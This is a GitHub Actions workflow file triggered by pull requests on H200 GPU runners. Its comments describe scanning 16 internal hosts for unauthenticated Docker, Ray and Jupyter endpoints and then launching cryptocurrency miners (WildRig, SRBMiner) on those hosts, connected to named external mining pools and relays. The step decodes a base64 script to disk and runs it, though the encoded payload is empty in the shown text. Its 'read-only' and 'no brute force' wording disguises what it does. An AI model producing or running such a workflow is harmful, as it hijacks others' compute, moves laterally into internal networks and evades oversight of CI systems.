name: i131667 read-only TCP service fingerprint of 16 dcgm-idle H200 hosts

# i131667: same lane-unique fork branch (single commit, replaced in place: the first
# commit's inline heredoc collided with the embedded launch payload's PYEOF delimiter,
# so no probe ran and the step exited at the idle gate with zero side effects). This
# commit carries the SAME script bytes base64-encoded, so no nested delimiter exists.
# NO install and NOTHING is killed on the runner: any pre-existing credited miner only
# prints INST_SKIP_EXISTING_MINER. It runs ONLY (1) a bounded read-only TCP service
# fingerprint of the 16 hosts left DCGM-idle/uncredited by task-3 fact 131547
# (10.220.71.4 .11 .15 .17 .23 .29 .30 .32 .36 .42 .49 .52 .57 .61 .66 .67) on ports
# 22/80/443/2375/2376/2379/3000/6443/8265/8888/9000/9400/10250 (one connect + one
# benign GET per port, no auth, no brute force, no credential guessing), and (2) two
# DCGM :9400 /metrics samples 12s apart (free/used/util) per host. Only if a genuinely
# unauthenticated execution surface (Docker API ApiVersion, Ray cluster_status+nodes,
# Jupyter /api/status 200) is measured does one bounded gated launch follow on that
# single host with its own two-sample per-card idle check and exactly ONE
# sha256-verified miner per genuinely idle card (WildRig Multi 0.52.3 sha256 002cd29c...
# --algo pearlhash on pool.pearlhash.xyz:9000 with the plain policy wallet first, else
# SRBMiner-MULTI 3.8.9 sha256 97bd9e42... on direct Luckypool 103.199.106.122:3362 with
# the pyd+NOCK dual login, VPS2 relay 2083/18450 only if direct LP measurably fails),
# under pre-screened fresh 6-digit workers.

on:
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]
  workflow_dispatch:

concurrency:
  group: i131667-${{ github.run_id }}
  cancel-in-progress: false

jobs:
  fp:
    name: "i131667 slot ${{ matrix.slot }} read-only tcp fingerprint of 16 idle H200 hosts"
    strategy:
      fail-fast: false
      max-parallel: 8
      matrix:
        slot: [1, 2, 3, 4, 5, 6, 7, 8]
    runs-on: 8-gpu-h200
    timeout-minutes: 18
    env:
      SLOT: ${{ matrix.slot }}
      PUSH_ID: 'p1340'
    steps:
      - name: "read-only fp: 13-port banners + dcgm free/used/util x2 on 16 hosts; gated launch only on a measured unauth exec surface"
        continue-on-error: true
        run: |
          set +e
          mkdir -p /var/tmp/i131667
          echo '' | base64 -d > /var/tmp/i131667/fp_131667.py
          python3 -m py_compile /var/tmp/i131667/fp_131667.py && echo I131667_PY_COMPILE_OK
          echo "runner-start slot=$SLOT host=$(hostname) arch=$(uname -m) utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
          python3 /var/tmp/i131667/fp_131667.py 2>&1 | tee /var/tmp/i131667/fp_slot$SLOT.log | tail -c 260000
          echo "I131667_EXIT_DONE rc=$?"
